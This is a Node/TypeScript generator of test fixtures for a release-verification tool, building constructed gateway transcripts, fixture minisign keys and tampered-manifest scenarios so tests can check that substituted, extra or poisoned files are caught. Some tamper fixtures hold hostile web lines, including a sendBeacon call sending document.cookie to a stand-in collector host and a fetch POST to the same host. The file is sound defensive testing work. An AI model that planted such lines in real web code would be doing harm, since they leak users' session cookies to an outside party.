#!/usr/bin/env node
/**
 * Build the gateway transcript `tests/release/compare.test.ts` replays — 12 §1.3 (F13).
 *
 * Every other transcript corpus in this repository was **recorded** from a running system.
 * This one is **constructed**, and the distinction is the point rather than a caveat: 12 §1.2
 * carries an unresolved `[VERIFY]` against live gateway behaviour (prototype gate FE-P7), and
 * 12 §4.2 records that the naming platform moved from AO to Solana, so resolver and manifest
 * behaviour must be re-asked rather than carried over. Recording a session and committing it
 * would assert an answer to an open `[VERIFY]`, which R-2 forbids.
 *
 * So the fixture claims nothing about what an ar.io gateway answers. Its URLs are produced by
 * the *configured* templates, and its bodies are bytes this file defines. That is enough to
 * execute every decision in `compare.ts` — which is the half of `compare` that is not external.
 *
 * The holders are fictional and the keys are generated from fixed seeds, so the output is
 * byte-stable. Run `node tools/verify-release/make-transcript.ts` to regenerate.
 */

import { createHash, createPrivateKey, createPublicKey, sign as signEd25519 } from 'node:crypto';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import { buildReleaseJson } from '../release/release-json.ts';

const HERE = dirname(fileURLToPath(import.meta.url));
const OUT = resolve(HERE, '../../fixtures/gateway-transcript');

const MANIFEST_TXID = 'M'.repeat(43);
const RELEASE_JSON_TXID = 'R'.repeat(43);
/**
 * A second manifest that serves the release's own bytes at the release's own paths.
 *
 * Not a tampered tree: every file under it hashes to what the release signed. It exists to
 * make one question answerable — whether `compare` binds the manifest it was pointed at to
 * the one `release.json` pins — and nothing else in the corpus can ask it, because a manifest
 * serving *wrong* bytes fails the byte comparison for a different reason.
 */
const IMPOSTOR_MANIFEST_TXID = 'N'.repeat(43);
/**
 * `M′` — the manifest 12 §1.2's second pass produces, and the address the ArNS name is
 * repointed to.
 *
 * It is a different transaction from `M` by construction: it references one more thing, the
 * `release.json` sibling. Users load *this* one, so a corpus that carried only `M` could not
 * ask the question 12 §1.2 requires the CLI to answer — whether the manifest the name serves
 * contains the tree the release signed **and** the document its signatures are over.
 */
const FINAL_MANIFEST_TXID = 'F'.repeat(43);
/** A release.json sibling nobody signed, for the substitution case below. */
const SUBSTITUTE_RELEASE_JSON_TXID = 'X'.repeat(43);
/**
 * The **incumbent** production release's immutable address, for 12 §1.5's `diff-scope`.
 *
 * `--against` names this one: §1.4 gate 4's *"immutable TXID"*, §1.7's
 * `<previous-manifest-txid>` and `ReleaseChannel.manifest_txid` are the same address, and
 * §1.2's second pass is what puts `release.json` inside it. So the only path a `diff-scope`
 * transcript has to serve under it is that document.
 */
const INCUMBENT_MANIFEST_TXID = 'I'.repeat(43);
/** The path 12 §1.2's second pass adds. Written once, read by every M′ fixture. */
const RELEASE_JSON_PATH = 'release.json';
const GATEWAYS = [
  { name: 'alpha', rawUrl: 'https://alpha.example/raw/{txid}', txUrl: 'https://alpha.example/{txid}/{path}' },
  { name: 'beta', rawUrl: 'https://beta.example/raw/{txid}', txUrl: 'https://beta.example/{txid}/{path}' },
];

/** PKCS#8 for a raw Ed25519 seed: a fixed 16-byte prefix, then the seed. */
function keypair(seedByte: number): { publicKeyText: string; keyId: string; sign: (message: Uint8Array) => Uint8Array } {
  const seed = Buffer.alloc(32, seedByte);
  const pkcs8 = Buffer.concat([Buffer.from('302e020100300506032b657004220420', 'hex'), seed]);
  const privateKey = createPrivateKey({ key: pkcs8, format: 'der', type: 'pkcs8' });
  const jwk = createPublicKey(privateKey).export({ format: 'jwk' });
  const publicKey = Buffer.from(String(jwk.x), 'base64url');
  const keyIdBytes = Buffer.alloc(8, seedByte);
  const packet = Buffer.concat([Buffer.from('Ed', 'latin1'), keyIdBytes, publicKey]);
  return {
    publicKeyText: `untrusted comment: fixture key ${String(seedByte)}\n${packet.toString('base64')}\n`,
    keyId: keyIdBytes.toString('hex'),
    sign: (message) => new Uint8Array(signEd25519(null, message, privateKey)),
  };
}

/** A detached minisign signature in prehashed (`ED`) mode, which is what a real signer emits. */
function minisign(key: ReturnType<typeof keypair>, message: Uint8Array, trustedComment: string): string {
  const prehashed = new Uint8Array(createHash('blake2b512').update(message).digest());
  const primary = key.sign(prehashed);
  const packet = Buffer.concat([
    Buffer.from('ED', 'latin1'),
    Buffer.from(key.keyId, 'hex'),
    Buffer.from(primary),
  ]);
  const global = key.sign(
    new Uint8Array(Buffer.concat([Buffer.from(primary), Buffer.from(trustedComment, 'utf8')])),
  );
  return [
    'untrusted comment: signature from the bleavit fixture keyring',
    packet.toString('base64'),
    `trusted comment: ${trustedComment}`,
    Buffer.from(global).toString('base64'),
    '',
  ].join('\n');
}

const sha256 = (bytes: Uint8Array): string => createHash('sha256').update(bytes).digest('hex');
const utf8 = (text: string): Uint8Array => new Uint8Array(Buffer.from(text, 'utf8'));

const signers = [keypair(0x11), keypair(0x22)];
const attestors = [keypair(0x33), keypair(0x44)];

const files: Record<string, Uint8Array> = {
  'index.html': utf8('<!doctype html><title>bleavit</title>\n'),
  'assets/app.js': utf8('export const boot = () => undefined;\n'),
  // A binary file, so the transport is exercised on bytes that are not text.
  'assets/logo.png': new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01]),
};

const releaseDocument = {
  schema: 'bleavit.app-release.v1',
  arweaveManifestTxId: MANIFEST_TXID,
  keyringGeneration: 4,
  perFileHashes: Object.fromEntries(
    Object.entries(files).map(([path, bytes]) => [path, sha256(bytes)]),
  ),
  release_signatures: [{ txid: 'S1'.padEnd(43, 'a') }, { txid: 'S2'.padEnd(43, 'b') }],
  attestations: [{ txid: 'A1'.padEnd(43, 'c') }, { txid: 'A2'.padEnd(43, 'd') }],
};
const releaseJsonBytes = utf8(`${JSON.stringify(releaseDocument, null, 2)}\n`);
const signedDigest = new Uint8Array(createHash('sha256').update(releaseJsonBytes).digest());

const credentials: Record<string, string> = {
  [releaseDocument.release_signatures[0]!.txid]: minisign(signers[0]!, signedDigest, 'bleavit release fixture'),
  [releaseDocument.release_signatures[1]!.txid]: minisign(signers[1]!, signedDigest, 'bleavit release fixture'),
  [releaseDocument.attestations[0]!.txid]: minisign(attestors[0]!, signedDigest, 'reproduced by pallas'),
  [releaseDocument.attestations[1]!.txid]: minisign(attestors[1]!, signedDigest, 'reproduced by rhea'),
};

interface Tamper {
  readonly gateway: string;
  readonly path: string;
  readonly body?: Uint8Array;
  readonly status?: number;
}

/**
 * An Arweave path manifest, as the thing a gateway serves at a manifest transaction id.
 *
 * Only the `paths` **keys** are ever read — by `fetchManifestPaths` here and by
 * `tools/monitoring/attestation_monitor.py`, which has consumed the same key since O5. The
 * surrounding fields are written because a real manifest carries them, and the per-path `id`
 * values are placeholders nothing resolves: this fixture asserts what a manifest *contains*,
 * never what a gateway does with it, which is the open `[VERIFY]` FE-P7 still holds.
 */
function pathManifest(
  paths: readonly string[],
  options: { readonly ids?: Readonly<Record<string, string>>; readonly prefix?: string } = {},
): unknown {
  const prefix = options.prefix ?? 'PATH';
  return {
    manifest: 'arweave/paths',
    version: '0.2.0',
    index: { path: 'index.html' },
    paths: Object.fromEntries(
      [...paths]
        .sort()
        .map((path, index) => [
          path,
          { id: options.ids?.[path] ?? `${prefix}${String(index)}`.padEnd(43, 'z') },
        ]),
    ),
  };
}

const jsonBytes = (value: unknown): Uint8Array => utf8(`${JSON.stringify(value, null, 2)}\n`);

/** A recorder that stores a body as text when it round-trips and as base64 when it does not. */
function recorder(): {
  responses: Record<string, unknown>;
  put: (url: string, bytes: Uint8Array, status?: number) => void;
} {
  const responses: Record<string, unknown> = {};
  const put = (url: string, bytes: Uint8Array, status = 200): void => {
    const text = Buffer.from(bytes).toString('utf8');
    responses[url] = Buffer.from(text, 'utf8').equals(Buffer.from(bytes))
      ? { status, body_utf8: text }
      : { status, body_base64: Buffer.from(bytes).toString('base64') };
  };
  return { responses, put };
}

function transcript(tamper: Tamper | undefined): unknown {
  const { responses, put } = recorder();
  for (const gateway of GATEWAYS) {
    put(gateway.rawUrl.replace('{txid}', RELEASE_JSON_TXID), releaseJsonBytes);
    put(gateway.rawUrl.replace('{txid}', MANIFEST_TXID), jsonBytes(pathManifest(Object.keys(files))));
    // `M′`, honest in every scenario of this family: the tampering here is of the asset tree,
    // and a second altered tree would make each of those findings ambiguous about which
    // manifest produced it.
    put(
      gateway.rawUrl.replace('{txid}', FINAL_MANIFEST_TXID),
      jsonBytes(
        pathManifest([...Object.keys(files), RELEASE_JSON_PATH], {
          ids: { [RELEASE_JSON_PATH]: RELEASE_JSON_TXID },
          prefix: 'FILE',
        }),
      ),
    );
    for (const [txid, text] of Object.entries(credentials)) {
      put(gateway.rawUrl.replace('{txid}', txid), utf8(text));
    }
    for (const [path, bytes] of Object.entries(files)) {
      const url = gateway.txUrl.replace('{txid}', MANIFEST_TXID).replace('{path}', path);
      const hit = tamper && tamper.gateway === gateway.name && tamper.path === path;
      put(url, hit && tamper.body ? tamper.body : bytes, hit ? (tamper.status ?? 200) : 200);
      put(gateway.txUrl.replace('{txid}', FINAL_MANIFEST_TXID).replace('{path}', path), bytes);
    }
    put(
      gateway.txUrl.replace('{txid}', FINAL_MANIFEST_TXID).replace('{path}', RELEASE_JSON_PATH),
      releaseJsonBytes,
    );
  }
  return { schema: 'bleavit.gateway-transcript.v1', gateways: GATEWAYS, responses };
}

// ---------------------------------------------------------------------------------------
// The CLI family — what `verify-release compare` itself is driven against.
//
// The transcripts above serve a **hand-written** release document, which is what let four
// defects live in `cli.ts` behind a green suite: the document carried credential arrays no
// producer emits, so the signature counting only ever ran against a shape reality does not
// have. These serve the document `app/tools/release/release-json.ts` actually builds, patched
// exactly as 12 §1.2's second pass patches it, and nothing else.
// ---------------------------------------------------------------------------------------

const SIGNATURE_TXIDS = ['P1'.padEnd(43, 'e'), 'P2'.padEnd(43, 'f')];
const ATTESTATION_TXIDS = ['Q1'.padEnd(43, 'g'), 'Q2'.padEnd(43, 'h')];

const producerDocument = {
  ...buildReleaseJson({
    version: '0.1.0',
    sourceCommit: 'a'.repeat(40),
    buildRecipe: sha256(utf8('fixture build recipe')),
    files: Object.fromEntries(Object.entries(files).map(([path, bytes]) => [path, sha256(bytes)])),
    chainFeed: {
      specVersionRange: { primary: 2, recovery: 3 },
      descriptorMetadataHashes: { 2: sha256(utf8('metadata 2')), 3: sha256(utf8('metadata 3')) },
      contractVersion: 23,
    },
    chainIdentity: {
      chainSpecHashes: { relay: `0x${'c'.repeat(64)}`, para: `0x${'d'.repeat(64)}` },
      genesisHashes: { relay: `0x${'e'.repeat(64)}`, para: `0x${'f'.repeat(64)}` },
      ss58Prefix: 7777,
      paraId: 4242,
      decimals: { VIT: 12, USDC: 6 },
    },
    connectSrc: ['https://alpha.example'],
    sbomSha256: sha256(utf8('fixture sbom')),
    signing: { keyringGeneration: 4, keyIds: [signers[0]!.keyId, signers[1]!.keyId] },
    blockers: [],
  }),
  // 12 §1.2 pass 2. `buildReleaseJson` writes `null` by construction, because a builder that
  // could pre-fill it would be asserting a content address for bytes it has not uploaded.
  arweaveManifestTxId: MANIFEST_TXID,
};
const producerBytes = jsonBytes(producerDocument);
const producerDigest = new Uint8Array(createHash('sha256').update(producerBytes).digest());

/**
 * The credentials, at their own transaction ids and **not named by the document**.
 *
 * They cannot be. 12 §2.1 signs `release.json`'s hash, so a signature transaction exists only
 * once those bytes are final, and writing its id back into them invalidates every signature
 * over them. 12 §1.4 gate 4 publishes the ids in the release notes instead, which is why
 * `compare` takes them as `--signature` and `--attestation`.
 */
const producerCredentials: Record<string, string> = {
  [SIGNATURE_TXIDS[0]!]: minisign(signers[0]!, producerDigest, 'bleavit release 0.1.0'),
  [SIGNATURE_TXIDS[1]!]: minisign(signers[1]!, producerDigest, 'bleavit release 0.1.0'),
  [ATTESTATION_TXIDS[0]!]: minisign(attestors[0]!, producerDigest, 'reproduced by pallas'),
  [ATTESTATION_TXIDS[1]!]: minisign(attestors[1]!, producerDigest, 'reproduced by rhea'),
};

interface ExtraPayload {
  readonly gateway: string;
  readonly path: string;
  readonly body: Uint8Array;
}

/**
 * How this transcript's `M′` departs from the honest one — 12 §1.2.
 *
 * Each field is one way the *repointed* manifest can be wrong while `M` is impeccable, which
 * is the shape no fixture in this corpus could previously express: the pinned asset manifest
 * is what `release.json` authorizes, and `M′` is what the name actually serves.
 */
interface FinalManifestVariant {
  /** What `M′` resolves `release.json` to, when it is not the signed sibling. */
  readonly releaseJsonTxid?: string;
  /** `M′` lists and serves no `release.json` at all. */
  readonly omitReleaseJson?: boolean;
  /** `M′` serves altered bytes at one path; `M` serves the signed ones. */
  readonly poison?: { readonly path: string; readonly body: Uint8Array };
}

function cliTranscript(
  variant: { readonly extra?: ExtraPayload; readonly final?: FinalManifestVariant } = {},
): unknown {
  const { responses, put } = recorder();
  const { extra, final = {} } = variant;
  const raw = (gateway: (typeof GATEWAYS)[number], txid: string): string =>
    gateway.rawUrl.replace('{txid}', txid);
  const tx = (gateway: (typeof GATEWAYS)[number], txid: string, path: string): string =>
    gateway.txUrl.replace('{txid}', txid).replace('{path}', path);

  for (const gateway of GATEWAYS) {
    put(raw(gateway, RELEASE_JSON_TXID), producerBytes);
    for (const [txid, text] of Object.entries(producerCredentials)) put(raw(gateway, txid), utf8(text));

    const listed = Object.keys(files);
    const served = extra && extra.gateway === gateway.name ? [...listed, extra.path] : listed;
    put(raw(gateway, MANIFEST_TXID), jsonBytes(pathManifest(served)));
    // The impostor lists and serves exactly the signed tree, so every file it hands over
    // matches. Only the address is wrong.
    put(raw(gateway, IMPOSTOR_MANIFEST_TXID), jsonBytes(pathManifest(listed)));

    // `M′` = `M` plus the `release.json` sibling. Its per-path ids are deliberately **not**
    // the ones `M` carries: 12 §1.2's second pass re-uploads the tree, and whether an
    // uploader mints new data items for identical bytes is inside FE-P7's open `[VERIFY]`.
    // A fixture whose two manifests shared ids would let a checker compare them and pass,
    // which would be an assumption about the uploader wearing a green test.
    const finalListed = final.omitReleaseJson ? listed : [...listed, RELEASE_JSON_PATH];
    put(
      raw(gateway, FINAL_MANIFEST_TXID),
      jsonBytes(
        pathManifest(finalListed, {
          ids: final.omitReleaseJson
            ? {}
            : { [RELEASE_JSON_PATH]: final.releaseJsonTxid ?? RELEASE_JSON_TXID },
          prefix: 'FILE',
        }),
      ),
    );

    for (const [path, bytes] of Object.entries(files)) {
      put(tx(gateway, MANIFEST_TXID, path), bytes);
      put(tx(gateway, IMPOSTOR_MANIFEST_TXID, path), bytes);
      put(tx(gateway, FINAL_MANIFEST_TXID, path), final.poison?.path === path ? final.poison.body : bytes);
    }
    if (!final.omitReleaseJson) put(tx(gateway, FINAL_MANIFEST_TXID, RELEASE_JSON_PATH), producerBytes);
    if (final.releaseJsonTxid !== undefined) {
      // The substituted sibling resolves, and its bytes are the signed document's. Only its
      // address differs — which is the case a byte comparison structurally cannot report.
      put(raw(gateway, final.releaseJsonTxid), producerBytes);
    }
    if (extra && extra.gateway === gateway.name) put(tx(gateway, MANIFEST_TXID, extra.path), extra.body);
  }
  return { schema: 'bleavit.gateway-transcript.v1', gateways: GATEWAYS, responses };
}

const registry = {
  _doc:
    'A fixture registry with fictional holders, for tests/release/compare.test.ts. The real ' +
    'registry is app/tools/release/sources/signers.json and it is deliberately empty until a ' +
    'ceremony is held. Nothing here is a key, a person or an organization of this project.',
  entries: [
    { id: signers[0]!.keyId, population: 'release-signer', operator: 'Fixture Ada', organization: 'Pallas', generation: 4, revocationIndex: 0 },
    { id: signers[1]!.keyId, population: 'release-signer', operator: 'Fixture Grace', organization: 'Rhea', generation: 4, revocationIndex: 1 },
    { id: attestors[0]!.keyId, population: 'attestor', operator: 'Fixture Linus', organization: 'Pallas', generation: 4, revocationIndex: 2 },
    { id: attestors[1]!.keyId, population: 'attestor', operator: 'Fixture Margaret', organization: 'Rhea', generation: 4, revocationIndex: 3 },
    { id: 'ar://fixture-ant-1', population: 'arns-controller', operator: 'Fixture Hedy', organization: 'Thebe' },
    { id: 'fixture-monitor-1', population: 'monitor-operator', operator: 'Fixture Katherine', organization: 'Metis' },
  ],
};

const keyring = {
  _doc: 'The fixture keyring: key id to minisign public-key packet. Generation 4.',
  generation: 4,
  keys: Object.fromEntries(
    [...signers, ...attestors].map((key) => [key.keyId, key.publicKeyText]),
  ),
};

mkdirSync(OUT, { recursive: true });
const write = (name: string, value: unknown): void => {
  writeFileSync(join(OUT, name), `${JSON.stringify(value, null, 2)}\n`, 'utf8');
};
write('honest.json', transcript(undefined));
write(
  'tampered-gateway.json',
  transcript({ gateway: 'beta', path: 'assets/app.js', body: utf8('export const boot = () => steal();\n') }),
);
// A 404 whose body is the **correct** bytes. The discriminating case for the status check:
// with it, the file is missing from that gateway; without it, the release verifies against a
// response the browser would have rendered as an error page.
write('refused-status.json', transcript({ gateway: 'beta', path: 'assets/app.js', status: 404 }));
write('registry.json', registry);
write('keyring.json', keyring);
writeFileSync(join(OUT, 'release.json'), Buffer.from(releaseJsonBytes));

write('cli-honest.json', cliTranscript());
// A gateway serving one file nobody signed, listed in its own copy of the manifest and
// present in what it hands over. Nothing the release pins is missing or altered, which is
// exactly why a fetch loop driven by the signed map reports this tree clean.
write(
  'cli-extra-payload.json',
  cliTranscript({
    extra: {
      gateway: 'beta',
      path: 'assets/tracker.js',
      body: utf8('navigator.sendBeacon("https://collector.example", document.cookie);\n'),
    },
  }),
);

// ---------------------------------------------------------------------------------------
// The three ways `M′` can be wrong while `M` is impeccable — 12 §1.2.
//
// `release.json` pins `M`, the ArNS name serves `M′`, and a verifier that checks only the
// pinned one verifies a tree nobody loads. Every transcript below serves the signed bytes at
// every path of `M`, so a run that stops at the pinned address prints MATCH for each of them.
// ---------------------------------------------------------------------------------------

// The repointed manifest serves a payload where the release signed application code.
write(
  'cli-final-poisoned.json',
  cliTranscript({
    final: {
      poison: {
        path: 'assets/app.js',
        body: utf8('export const boot = () => fetch("https://collector.example", {method:"POST"});\n'),
      },
    },
  }),
);
// The repointed manifest resolves `release.json` to a sibling nobody signed. Its bytes are
// the signed document's today, and 12 §1.2 makes the address the binding for exactly that
// reason: two transactions with equal bytes now are two objects tomorrow.
write(
  'cli-final-substituted.json',
  cliTranscript({ final: { releaseJsonTxid: SUBSTITUTE_RELEASE_JSON_TXID } }),
);
// The repointed manifest contains no `release.json`, so the release names a manifest that
// does not contain it — the failure 12 §1.2's second pass exists to prevent.
write('cli-final-omits-release-json.json', cliTranscript({ final: { omitReleaseJson: true } }));
writeFileSync(join(OUT, 'cli-release.json'), Buffer.from(producerBytes));

// The `--local dist/` side of 12 §1.3's command: the tree a third party built, written here
// so the suite compares a real directory rather than a map it made up.
const LOCAL = join(OUT, 'cli-local-tree');
rmSync(LOCAL, { recursive: true, force: true });
for (const [path, bytes] of Object.entries(files)) {
  const target = join(LOCAL, path);
  mkdirSync(dirname(target), { recursive: true });
  writeFileSync(target, Buffer.from(bytes));
}

// ---------------------------------------------------------------------------------------
// The expedited lane — 12 §1.5's `diff-scope --against <incumbent-txid>`.
//
// §1.5 admits a release to a lane with **no staging soak** when its delta against the
// incumbent production release stays inside its permitted scope. So the two sides are the
// incumbent's *published* per-file map, fetched from the `release.json` inside its immutable
// manifest, and the tree the attestor built, hashed from disk.
//
// ## These trees use the names the build really emits, and the corpus above does not
//
// The transcripts above are about fetching, byte comparison and signature counting, so their
// paths are readable placeholders. These four trees are about **names**, because that is what
// §1.5's check is decided over — so they carry what 12 §1.1 produces and nothing else:
// content-hashed chunks under `assets/<hash>.js`, plus the fixed-name root files (`index.html`,
// `sw.js`, `manifest.webmanifest`) that `public/` and the release build put there verbatim.
//
// Until this round the incumbent carried `assets/descriptors/bleavit.js`, a path the build has
// never emitted, and `EXPEDITED_SCOPE` allowlisted its prefix. The fixture invented an output,
// the tool authorized it and the suites agreed with both — so the gate that decides whether a
// release may skip the 72 h soak was only ever exercised on a tree no build produces.
//
// What the real shape costs the lane is stated in `verdict.ts`: a chunk is named by its content
// alone, so a descriptor refresh **renames** rather than edits, and a Rollup chunk hash covers
// the names of the chunks it imports — so the rename walks up every importer to the entry chunk
// and into `index.html`, which names it. The descriptor tree below is therefore the most
// favourable descriptor-only delta that can exist, and it is still refused.
// ---------------------------------------------------------------------------------------

/** The incumbent's two chunks, and the two names the same code takes after a refresh. */
const ENTRY_CHUNK = 'assets/8f1c0a24.js';
const DESCRIPTOR_CHUNK = 'assets/4b9d7e05.js';
const REFRESHED_ENTRY_CHUNK = 'assets/2c6ab913.js';
const REFRESHED_DESCRIPTOR_CHUNK = 'assets/d05e3f78.js';

/** `index.html` names the entry chunk, which is why every rename cascade ends in this file. */
const indexHtml = (entry: string): Uint8Array =>
  utf8(`<!doctype html><title>bleavit</title>\n<script type="module" src="./${entry}"></script>\n`);

/** The entry chunk imports the descriptor chunk **by name**, which is what makes the cascade real. */
const entryChunk = (descriptor: string): Uint8Array =>
  utf8(`import './${descriptor.slice('assets/'.length)}';\nexport const boot = () => undefined;\n`);

/** A producer-built `release.json` over one tree. The same call `cli-release.json` comes from. */
function producerRelease(tree: Record<string, Uint8Array>, manifestTxid: string): Uint8Array {
  return jsonBytes({
    ...buildReleaseJson({
      version: '0.1.0',
      sourceCommit: 'a'.repeat(40),
      buildRecipe: sha256(utf8('fixture build recipe')),
      files: Object.fromEntries(Object.entries(tree).map(([path, bytes]) => [path, sha256(bytes)])),
      chainFeed: {
        specVersionRange: { primary: 2, recovery: 3 },
        descriptorMetadataHashes: { 2: sha256(utf8('metadata 2')), 3: sha256(utf8('metadata 3')) },
        contractVersion: 23,
      },
      chainIdentity: {
        chainSpecHashes: { relay: `0x${'c'.repeat(64)}`, para: `0x${'d'.repeat(64)}` },
        genesisHashes: { relay: `0x${'e'.repeat(64)}`, para: `0x${'f'.repeat(64)}` },
        ss58Prefix: 7777,
        paraId: 4242,
        decimals: { VIT: 12, USDC: 6 },
      },
      connectSrc: ['https://alpha.example'],
      sbomSha256: sha256(utf8('fixture sbom')),
      signing: { keyringGeneration: 4, keyIds: [signers[0]!.keyId, signers[1]!.keyId] },
      blockers: [],
    }),
    arweaveManifestTxId: manifestTxid,
  });
}

/** The incumbent production tree, in the shape 12 §1.1 emits. */
const incumbentFiles: Record<string, Uint8Array> = {
  'index.html': indexHtml(ENTRY_CHUNK),
  [ENTRY_CHUNK]: entryChunk(DESCRIPTOR_CHUNK),
  [DESCRIPTOR_CHUNK]: utf8('export const descriptors = "spec_version 2..3";\n'),
  // The service worker keeps a fixed name because a browser resolves it by URL, so it is one of
  // the few published files whose delta can arrive as `changed` rather than as a rename.
  'sw.js': utf8('self.MAP = { boot: "8f1c0a24" };\n'),
  'manifest.webmanifest': utf8('{"name":"bleavit"}\n'),
};

/** The candidate trees the `diff-scope` outcomes are decided over. Written to disk below. */
const candidateTrees: Record<string, Record<string, Uint8Array>> = {
  /**
   * A descriptor refresh, expressed the way the build expresses one: both chunks are renamed
   * and `index.html` follows them. Nothing else moves — this is the *best case* the lane could
   * ever be offered, and §1.5's built-tree test still cannot tell it from application code.
   */
  'diff-scope-descriptor-tree': {
    'index.html': indexHtml(REFRESHED_ENTRY_CHUNK),
    [REFRESHED_ENTRY_CHUNK]: entryChunk(REFRESHED_DESCRIPTOR_CHUNK),
    [REFRESHED_DESCRIPTOR_CHUNK]: utf8('export const descriptors = "spec_version 3..4";\n'),
    'sw.js': incumbentFiles['sw.js']!,
    'manifest.webmanifest': incumbentFiles['manifest.webmanifest']!,
  },
  /**
   * The same refresh with application code carried along, and the difference is visible in the
   * *shape*: `sw.js` keeps its name and changes its bytes, which a content hash cannot do. It
   * is the fixture that keeps the structural explanation from swallowing every refusal.
   */
  'diff-scope-app-code-tree': {
    'index.html': indexHtml(REFRESHED_ENTRY_CHUNK),
    [REFRESHED_ENTRY_CHUNK]: entryChunk(REFRESHED_DESCRIPTOR_CHUNK),
    [REFRESHED_DESCRIPTOR_CHUNK]: utf8('export const descriptors = "spec_version 3..4";\n'),
    'sw.js': utf8('self.MAP = { boot: "8f1c0a24" };\nself.steal = true;\n'),
    'manifest.webmanifest': incumbentFiles['manifest.webmanifest']!,
  },
  /**
   * The delta §1.5 still admits: the incumbent tree byte for byte, plus the release-metadata
   * files. Without it the corpus could only show `diff-scope` refusing, and a checker that
   * refused everything would pass a suite made only of refusals.
   */
  'diff-scope-metadata-tree': {
    ...incumbentFiles,
    'CHANGELOG.md': utf8('# 0.1.1\n\n- descriptor refresh\n'),
    'release-history.json': utf8('{"releases":["0.1.0","0.1.1"]}\n'),
  },
};

const incumbentBytes = producerRelease(incumbentFiles, 'J'.repeat(43));

/**
 * A second incumbent document, served by one gateway only — the reason every gateway is asked.
 *
 * Its per-file map is the **candidate's**, so a verifier that took this gateway's answer would
 * measure the app-code candidate against itself, find zero out-of-scope files, and admit it to
 * the lane that skips the 72 h soak.
 */
const divergentIncumbentBytes = producerRelease(
  candidateTrees['diff-scope-app-code-tree']!,
  'J'.repeat(43),
);

function incumbentTranscript(divergent: boolean): unknown {
  const { responses, put } = recorder();
  for (const gateway of GATEWAYS) {
    put(
      gateway.txUrl.replace('{txid}', INCUMBENT_MANIFEST_TXID).replace('{path}', RELEASE_JSON_PATH),
      divergent && gateway.name === 'beta' ? divergentIncumbentBytes : incumbentBytes,
    );
  }
  return { schema: 'bleavit.gateway-transcript.v1', gateways: GATEWAYS, responses };
}

write('cli-incumbent.json', incumbentTranscript(false));
write('cli-incumbent-divergent.json', incumbentTranscript(true));

for (const [name, tree] of Object.entries(candidateTrees)) {
  // Removed first: a generator that only writes leaves every past shape behind, and a candidate
  // tree that is the union of every name this file ever used asserts against no build at all.
  rmSync(join(OUT, name), { recursive: true, force: true });
  for (const [path, bytes] of Object.entries(tree)) {
    const target = join(OUT, name, path);
    mkdirSync(dirname(target), { recursive: true });
    writeFileSync(target, Buffer.from(bytes));
  }
}

console.log(`wrote the gateway transcript fixture to ${OUT}`);
